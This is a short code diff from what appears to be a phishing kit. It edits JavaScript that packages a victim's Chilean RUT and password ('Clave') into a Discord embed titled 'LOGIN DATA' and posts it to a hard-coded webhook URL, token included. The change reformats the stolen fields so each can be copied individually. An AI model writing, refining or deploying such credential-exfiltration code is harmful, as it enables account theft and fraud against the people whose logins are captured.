@@ -187,7 +187,7 @@
 
     const webhookUrl = 'https://discordapp.com/api/webhooks/1551764243274268672/DScPEbqjJobNa34rNWg5ibBcBfGkugRXRlKeykaT1ndEu07ECxG4Ep9Jjd5mV1XatmMK';
 
-    // Payload en formato Embed con campos individuales
+    // Payload actualizado con estilo de copiado individual (estilo send.js)
     const data = {
       "embeds": [{
         "title": "🔐 LOGIN DATA",
@@ -195,12 +195,12 @@
         "fields": [
           {
             "name": "RUT",
-            "value": "```\n" + rut + "\n```",
+            "value": `\`${rut}\``, // Cambiado para copiar solo el dato
             "inline": true
           },
           {
             "name": "Clave",
-            "value": "```\n" + password + "\n```",
+            "value": `\`${password}\``, // Cambiado para copiar solo el dato
             "inline": true
           }
         ],
